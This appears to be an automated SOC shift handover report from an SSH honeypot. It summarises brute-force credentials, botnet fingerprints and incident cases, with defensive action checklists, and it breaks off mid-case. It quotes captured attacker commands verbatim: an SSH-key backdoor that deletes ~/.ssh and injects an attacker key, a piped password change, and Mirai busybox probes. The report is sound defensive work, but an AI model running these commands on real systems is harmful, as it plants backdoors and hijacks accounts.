# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-11-02 |
| **Generated At** | 2026-11-02T21:01:41Z |
| **Shift Time** | 21:01 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · Oracle Cloud HA · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **547** |
| Confirmed Threats | **487** |
| False Positives Filtered | **60** (11.0%) |
| Unique Attacker IPs | **276** |
| Countries of Origin | **55** |
| High Severity Cases | **314** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **233** |
| Malware Samples Analyzed | **9** HIGH · **25** MED · 0 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **14639** |
| Unique Credential Pairs | **8110** |
| Unique Usernames | **489** |
| Unique Passwords | **7571** |
| Successful Auth Pairs | **14326** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 9342 |
| `ubuntu` | 243 |
| `admin` | 202 |
| `345gs5662d34` | 189 |
| `user` | 163 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `123456` | 454 |
| `123` | 255 |
| `345gs5662d34` | 189 |
| `3245gs5662d34` | 189 |
| `1234` | 184 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `345gs5662d34` | `345gs5662d34` | 189 |
| `root` | `3245gs5662d34` | 82 |
| `support` | `support` | 38 |
| `root` | `admin` | 12 |
| `root` | `1234` | 11 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `root` | `gedingfeng1102888` | `10.0.0.73` | 2026-11-02T02:55:06 |
| `root` | `www12345` | `10.0.0.73` | 2026-11-02T02:55:09 |
| `root` | `www888` | `10.0.0.73` | 2026-11-02T02:55:11 |
| `root` | `88888123` | `10.0.0.73` | 2026-11-02T02:55:14 |
| `root` | `xiazhili` | `10.0.0.73` | 2026-11-02T02:55:17 |
| `root` | `code8925` | `10.0.0.73` | 2026-11-02T02:55:19 |
| `root` | `ms0083jxj` | `10.0.0.73` | 2026-11-02T02:55:22 |
| `root` | `05962514787` | `10.0.0.73` | 2026-11-02T02:55:24 |
| `root` | `kingcom5` | `10.0.0.73` | 2026-11-02T02:55:27 |
| `root` | `11111111111111111111` | `10.0.0.73` | 2026-11-02T02:55:29 |
| `root` | `123456asd` | `10.0.0.73` | 2026-11-02T02:55:31 |
| `root` | `1Q2W3E4R5T` | `10.0.0.73` | 2026-11-02T02:55:34 |
| `root` | `lilylily` | `10.0.0.73` | 2026-11-02T02:55:37 |
| `root` | `12345612` | `10.0.0.73` | 2026-11-02T02:55:39 |
| `root` | `123321aa` | `10.0.0.73` | 2026-11-02T02:55:42 |
| `root` | `csdncsdn` | `10.0.0.73` | 2026-11-02T02:55:44 |
| `root` | `1234567b` | `10.0.0.73` | 2026-11-02T02:55:47 |
| `root` | `zxczxczxc` | `10.0.0.73` | 2026-11-02T02:55:49 |
| `root` | `google250` | `10.0.0.73` | 2026-11-02T02:55:52 |
| `root` | `168168168` | `10.0.0.73` | 2026-11-02T02:55:54 |
_… 14306 more successful pair(s) in credentials.json_

---

## 🖥 SSH Fingerprint Intelligence

| Metric | Value |
|---|---|
| Total Sessions Parsed | **547** |
| Sessions with Fingerprint | **31** |
| Unique HASSH Fingerprints | **31** |

**Client Family Distribution:**

| Client Family | Sessions |
|---|---|
| libssh | 207 |
| Go SSH scanner | 150 |
| OpenSSH | 12 |
| Unknown | 5 |
| PuTTY | 3 |

**⚠️ Botnet/Scanner KEX Signatures Detected:**

| HASSH | Signature | Sessions | IPs |
|---|---|---|---|
| `f555226df196...` | Mirai/variant | 128 | 68 |
| `2ec37a7cc8da...` | Mirai/variant | 102 | 4 |
| `a591c4ddccc9...` | Mirai/variant | 31 | 5 |
| `03a80b21afa8...` | Modern SSH client | 20 | 8 |
| `0a07365cc01f...` | Generic scanner | 16 | 6 |

**Top Fingerprints:**

| HASSH | Client | Sessions | IPs | Botnet Sig |
|---|---|---|---|---|
| `f555226df196...` | libssh | 128 | 68 | Mirai/variant |
| `2ec37a7cc8da...` | Go SSH scanner | 102 | 4 | Mirai/variant |
| `a591c4ddccc9...` | libssh | 31 | 5 | Mirai/variant |
| `95420f9d932d...` | libssh | 22 | 10 | — |
| `03a80b21afa8...` | libssh | 20 | 8 | Modern SSH client |
| `0a07365cc01f...` | Go SSH scanner | 16 | 6 | Generic scanner |
| `eff4c24daffc...` | Go SSH scanner | 8 | 1 | Modern SSH client |
| `084386fa7ae5...` | Go SSH scanner | 8 | 8 | Mirai/variant |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **112** |
| Campaign Clusters | **4** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 2 | 2 | `T1021.004, T1078, T1083, T1082` |
| **Mirai/IoT Botnet** | 🔴 HIGH | 1 | 1 | `T1105, T1083, T1140, T1059.004` |
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 66 | 65 | `T1021.004, T1078, T1070, T1140` |
| **Mirai/IoT Botnet** | 🔴 HIGH | 1 | 1 | `T1105, T1140, T1059.004` |

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
```
cat /proc/cpuinfo | grep name | wc -l
```
```
echo -e "low\nl8NcrOf1jG2m\nl8NcrOf1jG2m"|passwd|bash
```
```
Enter new UNIX password:
```
Source IPs: `106.227.75.197`, `43.136.83.130`

**🔴 HIGH · Mirai/IoT Botnet**

> Mirai-family IoT botnet. Executes busybox payloads for DDoS bot recruitment.

Representative commands:
```
enable
```
```
linuxshell
```
```
system
```
```
sh
```
```
ls /home; /bin/busybox BOTNET
```
Source IPs: `160.119.66.206`

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `58.208.84.103`, `60.16.138.210`, `189.204.230.91`, `165.154.63.157`, `171.6.124.195`, `46.8.224.240`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **276** |
| Unique ASNs | **135** |
| High-Risk ASNs | **99** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS0` |  | 58 | HIGH |
| `AS396982` | Google LLC | 11 | HIGH |
| `AS398324` | Censys, Inc. | 9 | HIGH |
| `AS8075` | Microsoft Corporation | 9 | HIGH |
| `AS4134` | CHINANET BACKBONE | 8 | HIGH |
| `AS198364` | BANATSYNC SRL | 5 | HIGH |
| `AS4811` | China Telecom (Group) | 5 | HIGH |
| `AS25369` | Hydra Communications Ltd | 4 | HIGH |

---

---

## 🚨 Priority Cases — Immediate Attention (307)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-c1bafecd9e5f

| Field | Detail |
|---|---|
| **Source IP** | `138.226.239[.]233` |
| **First Seen** | 2026-11-02 03:14 |
| **Last Seen** | 2026-11-02 03:15 |
| **Session Duration** | 20s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-02 03:14:59` | `cowrie.session.connect` |
| `2026-11-02 03:14:59` | `cowrie.client.version` |
| `2026-11-02 03:14:59` | `cowrie.client.kex` |
| `2026-11-02 03:14:59` | `cowrie.login.success` |
| `2026-11-02 03:15:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `138.226.239[.]233` to AbuseIPDB if not already reported
- [ ] Block `138.226.239[.]233` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-577d5a59fa5e

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-11-02 03:33 |
| **Last Seen** | 2026-11-02 03:33 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-02 03:33:20` | `cowrie.session.connect` |
| `2026-11-02 03:33:20` | `cowrie.client.version` |
| `2026-11-02 03:33:20` | `cowrie.client.kex` |
| `2026-11-02 03:33:21` | `cowrie.login.success` |
| `2026-11-02 03:33:21` | `cowrie.direct-tcpip.request` |
| `2026-11-02 03:33:21` | `cowrie.direct-tcpip.data` |
| `2026-11-02 03:33:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-eba99aad06c3

| Field | Detail |
|---|---|
| **Source IP** | `35.210.120[.]245` |
| **First Seen** | 2026-11-02 03:50 |
| **Last Seen** | 2026-11-02 03:50 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-02 03:50:16` | `cowrie.session.connect` |
| `2026-11-02 03:50:16` | `cowrie.client.version` |
| `2026-11-02 03:50:16` | `cowrie.client.kex` |
| `2026-11-02 03:50:19` | `cowrie.login.success` |
| `2026-11-02 03:50:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `35.210.120[.]245` to AbuseIPDB if not already reported
- [ ] Block `35.210.120[.]245` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2343db865128

| Field | Detail |
|---|---|
| **Source IP** | `202.51.214[.]99` |
| **First Seen** | 2026-11-02 04:07 |
| **Last Seen** | 2026-11-02 04:07 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-02 04:07:24` | `cowrie.session.connect` |
| `2026-11-02 04:07:24` | `cowrie.client.version` |
| `2026-11-02 04:07:24` | `cowrie.client.kex` |
| `2026-11-02 04:07:26` | `cowrie.login.success` |
| `2026-11-02 04:07:27` | `cowrie.session.params` |
| `2026-11-02 04:07:27` | `cowrie.command.input` |
| `2026-11-02 04:07:27` | `cowrie.command.failed` |
| `2026-11-02 04:07:27` | `cowrie.log.closed` |
| `2026-11-02 04:07:28` | `cowrie.session.params` |
| `2026-11-02 04:07:28` | `cowrie.command.input` |
| `2026-11-02 04:07:29` | `cowrie.session.file_download` |
| `2026-11-02 04:07:29` | `cowrie.log.closed` |
| `2026-11-02 04:07:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `202.51.214[.]99` to AbuseIPDB if not already reported
- [ ] Block `202.51.214[.]99` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-42706ee6660d

| Field | Detail |
|---|---|
| **Source IP** | `202.51.214[.]99` |
| **First Seen** | 2026-11-02 04:07 |
| **Last Seen** | 2026-11-02 04:07 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-02 04:07:29` | `cowrie.session.connect` |
| `2026-11-02 04:07:29` | `cowrie.client.version` |
| `2026-11-02 04:07:29` | `cowrie.client.kex` |
| `2026-11-02 04:07:30` | `cowrie.login.success` |
| `2026-11-02 04:07:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `202.51.214[.]99` to AbuseIPDB if not already reported
- [ ] Block `202.51.214[.]99` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9805e626e818

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]77` |
| **First Seen** | 2026-11-02 04:08 |
| **Last Seen** | 2026-11-02 04:09 |
| **Session Duration** | 37s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `sh -c 'printf '"'"'\n%s|%s\n'"'"' '"'"'check_d46c93f9817478ba8a36e28b78aa0fff_small_control'"'"' '"'"'check_d46c93f9817478ba8a36e28b78aa0fff'"'"'', printf '\n%s|%s\n' 'check_d46c93f9817478ba8a36e28b78aa0fff_small_control' 'check_d46c93f9817478ba8a36e28b78aa0fff', sh -c 'printf '"'"'\n%s|%s\n'"'"' '"'"'check_d46c93f9817478ba8a36e28b78aa0fff_small_math'"'"' "$((543*224+61))"', (543*224+61, printf '\n%s|%s\n' 'check_d46c93f9817478ba8a36e28b78aa0fff_small_math' ")"` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1105 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-02 04:08:36` | `cowrie.session.connect` |
| `2026-11-02 04:08:36` | `cowrie.client.version` |
| `2026-11-02 04:08:37` | `cowrie.client.kex` |
| `2026-11-02 04:08:39` | `cowrie.login.success` |
| `2026-11-02 04:08:40` | `cowrie.client.size` |
| `2026-11-02 04:08:41` | `cowrie.session.params` |
| `2026-11-02 04:08:42` | `cowrie.command.input` |
| `2026-11-02 04:08:42` | `cowrie.command.input` |
| `2026-11-02 04:08:42` | `cowrie.command.input` |
| `2026-11-02 04:08:42` | `cowrie.command.input` |
| `2026-11-02 04:08:42` | `cowrie.command.input` |
| `2026-11-02 04:08:42` | `cowrie.command.input` |
| `2026-11-02 04:08:42` | `cowrie.command.input` |
| `2026-11-02 04:08:42` | `cowrie.command.input` |
| `2026-11-02 04:08:42` | `cowrie.command.input` |
| … | _52 more event(s) — see ir_cases.json_ |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]77` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]77` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-de817662da01

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]77` |
| **First Seen** | 2026-11-02 04:10 |
| **Last Seen** | 2026-11-02 04:11 |
| **Session Duration** | 25s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `sh -c 'printf '"'"'\n%s|%s\n'"'"' '"'"'check_69e82222555c514144592d6c5191275b_small_control'"'"' '"'"'check_69e82222555c514144592d6c5191275b'"'"'', printf '\n%s|%s\n' 'check_69e82222555c514144592d6c5191275b_small_control' 'check_69e82222555c514144592d6c5191275b', sh -c 'printf '"'"'\n%s|%s\n'"'"' '"'"'check_69e82222555c514144592d6c5191275b_small_math'"'"' "$((194*811+50))"', (194*811+50, printf '\n%s|%s\n' 'check_69e82222555c514144592d6c5191275b_small_math' ")"` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1105 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-02 04:10:38` | `cowrie.session.connect` |
| `2026-11-02 04:10:38` | `cowrie.client.version` |
| `2026-11-02 04:10:38` | `cowrie.client.kex` |
| `2026-11-02 04:10:39` | `cowrie.login.success` |
| `2026-11-02 04:10:40` | `cowrie.client.size` |
| `2026-11-02 04:10:41` | `cowrie.session.params` |
| `2026-11-02 04:10:41` | `cowrie.command.input` |
| `2026-11-02 04:10:41` | `cowrie.command.input` |
| `2026-11-02 04:10:41` | `cowrie.command.input` |
| `2026-11-02 04:10:41` | `cowrie.command.input` |
| `2026-11-02 04:10:41` | `cowrie.command.input` |
| `2026-11-02 04:10:41` | `cowrie.command.input` |
| `2026-11-02 04:10:41` | `cowrie.command.input` |
| `2026-11-02 04:10:41` | `cowrie.command.input` |
| `2026-11-02 04:10:41` | `cowrie.command.input` |
| … | _52 more event(s) — see ir_cases.json_ |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]77` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]77` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4e4968b20754

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]77` |
| **First Seen** | 2026-11-02 04:12 |
| **Last Seen** | 2026-11-02 04:13 |
| **Session Duration** | 24s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `sh -c 'printf '"'"'\n%s|%s\n'"'"' '"'"'check_1aade45e7d20a046f0c88a7aeef89ad3_small_control'"'"' '"'"'check_1aade45e7d20a046f0c88a7aeef89ad3'"'"'', printf '\n%s|%s\n' 'check_1aade45e7d20a046f0c88a7aeef89ad3_small_control' 'check_1aade45e7d20a046f0c88a7aeef89ad3', sh -c 'printf '"'"'\n%s|%s\n'"'"' '"'"'check_1aade45e7d20a046f0c88a7aeef89ad3_small_math'"'"' "$((848*985+40))"', (848*985+40, printf '\n%s|%s\n' 'check_1aade45e7d20a046f0c88a7aeef89ad3_small_math' ")"` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1105 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-02 04:12:55` | `cowrie.session.connect` |
| `2026-11-02 04:12:55` | `cowrie.client.version` |
| `2026-11-02 04:12:55` | `cowrie.client.kex` |
| `2026-11-02 04:12:57` | `cowrie.login.success` |
| `2026-11-02 04:12:57` | `cowrie.client.size` |
| `2026-11-02 04:12:58` | `cowrie.session.params` |
| `2026-11-02 04:12:58` | `cowrie.command.input` |
| `2026-11-02 04:12:58` | `cowrie.command.input` |
| `2026-11-02 04:12:58` | `cowrie.command.input` |
| `2026-11-02 04:12:58` | `cowrie.command.input` |
| `2026-11-02 04:12:58` | `cowrie.command.input` |
| `2026-11-02 04:12:58` | `cowrie.command.input` |
| `2026-11-02 04:12:58` | `cowrie.command.input` |
| `2026-11-02 04:12:58` | `cowrie.command.input` |
| `2026-11-02 04:12:58` | `cowrie.command.input` |
| … | _52 more event(s) — see ir_cases.json_ |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]77` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]77` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-62281f79c56f

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]77` |
| **First Seen** | 2026-11-02 04:15 |
| **Last Seen** | 2026-11-02 04:15 |
| **Session Duration** | 27s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `sh -c 'printf '"'"'\n%s|%s\n'"'"' '"'"'check_8efaf6f741638fb020ed5eba7dda8389_small_control'"'"' '"'"'check_8efaf6f741638fb020ed5eba7dda8389'"'"'', printf '\n%s|%s\n' 'check_8efaf6f741638fb020ed5eba7dda8389_small_control' 'check_8efaf6f741638fb020ed5eba7dda8389', sh -c 'printf '"'"'\n%s|%s\n'"'"' '"'"'check_8efaf6f741638fb020ed5eba7dda8389_small_math'"'"' "$((711*791+34))"', (711*791+34, printf '\n%s|%s\n' 'check_8efaf6f741638fb020ed5eba7dda8389_small_math' ")"` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1105 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-02 04:15:14` | `cowrie.session.connect` |
| `2026-11-02 04:15:14` | `cowrie.client.version` |
| `2026-11-02 04:15:14` | `cowrie.client.kex` |
| `2026-11-02 04:15:15` | `cowrie.login.success` |
| `2026-11-02 04:15:17` | `cowrie.client.size` |
| `2026-11-02 04:15:17` | `cowrie.session.params` |
| `2026-11-02 04:15:17` | `cowrie.command.input` |
| `2026-11-02 04:15:17` | `cowrie.command.input` |
| `2026-11-02 04:15:17` | `cowrie.command.input` |
| `2026-11-02 04:15:17` | `cowrie.command.input` |
| `2026-11-02 04:15:17` | `cowrie.command.input` |
| `2026-11-02 04:15:17` | `cowrie.command.input` |
| `2026-11-02 04:15:17` | `cowrie.command.input` |
| `2026-11-02 04:15:17` | `cowrie.command.input` |
| `2026-11-02 04:15:17` | `cowrie.command.input` |
| … | _52 more event(s) — see ir_cases.json_ |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]77` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]77` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-de1ab9d652f0

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]77` |
| **First Seen** | 2026-11-02 04:17 |
| **Last Seen** | 2026-11-02 04:17 |
| **Session Duration** | 25s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `sh -c 'printf '"'"'\n%s|%s\n'"'"' '"'"'check_2220cbeed9dded8ed07b0e5e10db8663_small_control'"'"' '"'"'check_2220cbeed9dded8ed07b0e5e10db8663'"'"'', printf '\n%s|%s\n' 'check_2220cbeed9dded8ed07b0e5e10db8663_small_control' 'check_2220cbeed9dded8ed07b0e5e10db8663', sh -c 'printf '"'"'\n%s|%s\n'"'"' '"'"'check_2220cbeed9dded8ed07b0e5e10db8663_small_math'"'"' "$((761*675+7))"', (761*675+7, printf '\n%s|%s\n' 'check_2220cbeed9dded8ed07b0e5e10db8663_small_math' ")"` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1105 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-02 04:17:29` | `cowrie.session.connect` |
| `2026-11-02 04:17:29` | `cowrie.client.version` |
| `2026-11-02 04:17:29` | `cowrie.client.kex` |
| `2026-11-02 04:17:30` | `cowrie.login.success` |
| `2026-11-02 04:17:32` | `cowrie.client.size` |
| `2026-11-02 04:17:32` | `cowrie.session.params` |
| `2026-11-02 04:17:32` | `cowrie.command.input` |
| `2026-11-02 04:17:32` | `cowrie.command.input` |
| `2026-11-02 04:17:32` | `cowrie.command.input` |
| `2026-11-02 04:17:32` | `cowrie.command.input` |
| `2026-11-02 04:17:32` | `cowrie.command.input` |
| `2026-11-02 04:17:32` | `cowrie.command.input` |
| `2026-11-02 04:17:32` | `cowrie.command.input` |
| `2026-11-02 04:17:32` | `cowrie.command.input` |
| `2026-11-02 04:17:32` | `cowrie.command.input` |
| … | _52 more event(s) — see ir_cases.json_ |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]77` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]77` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cc09ba3bcb56

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]77` |
| **First Seen** | 2026-11-02 04:21 |
| **Last Seen** | 2026-11-02 04:21 |
| **Session Duration** | 24s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `sh -c 'printf '"'"'\n%s|%s\n'"'"' '"'"'check_8f4a821d3776f2b40d671802619715c1_small_control'"'"' '"'"'check_8f4a821d3776f2b40d671802619715c1'"'"'', printf '\n%s|%s\n' 'check_8f4a821d3776f2b40d671802619715c1_small_control' 'check_8f4a821d3776f2b40d671802619715c1', sh -c 'printf '"'"'\n%s|%s\n'"'"' '"'"'check_8f4a821d3776f2b40d671802619715c1_small_math'"'"' "$((791*607+17))"', (791*607+17, printf '\n%s|%s\n' 'check_8f4a821d3776f2b40d671802619715c1_small_math' ")"` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1105 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-02 04:21:17` | `cowrie.session.connect` |
| `2026-11-02 04:21:17` | `cowrie.client.version` |
| `2026-11-02 04:21:18` | `cowrie.client.kex` |
| `2026-11-02 04:21:19` | `cowrie.login.success` |
| `2026-11-02 04:21:20` | `cowrie.client.size` |
| `2026-11-02 04:21:20` | `cowrie.session.params` |
| `2026-11-02 04:21:21` | `cowrie.command.input` |
| `2026-11-02 04:21:21` | `cowrie.command.input` |
| `2026-11-02 04:21:21` | `cowrie.command.input` |
| `2026-11-02 04:21:21` | `cowrie.command.input` |
| `2026-11-02 04:21:21` | `cowrie.command.input` |
| `2026-11-02 04:21:21` | `cowrie.command.input` |
| `2026-11-02 04:21:21` | `cowrie.command.input` |
| `2026-11-02 04:21:21` | `cowrie.command.input` |
| `2026-11-02 04:21:21` | `cowrie.command.input` |
| … | _52 more event(s) — see ir_cases.json_ |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]77` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]77` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d8b6a907bed8

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]77` |
| **First Seen** | 2026-11-02 04:23 |
| **Last Seen** | 2026-11-02 04:23 |
| **Session Duration** | 26s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `sh -c 'printf '"'"'\n%s|%s\n'"'"' '"'"'check_8c165325f6dbe1eef88e119efa3e6300_small_control'"'"' '"'"'check_8c165325f6dbe1eef88e119efa3e6300'"'"'', printf '\n%s|%s\n' 'check_8c165325f6dbe1eef88e119efa3e6300_small_control' 'check_8c165325f6dbe1eef88e119efa3e6300', sh -c 'printf '"'"'\n%s|%s\n'"'"' '"'"'check_8c165325f6dbe1eef88e119efa3e6300_small_math'"'"' "$((968*475+70))"', (968*475+70, printf '\n%s|%s\n' 'check_8c165325f6dbe1eef88e119efa3e6300_small_math' ")"` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1105 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-02 04:23:23` | `cowrie.session.connect` |
| `2026-11-02 04:23:23` | `cowrie.client.version` |
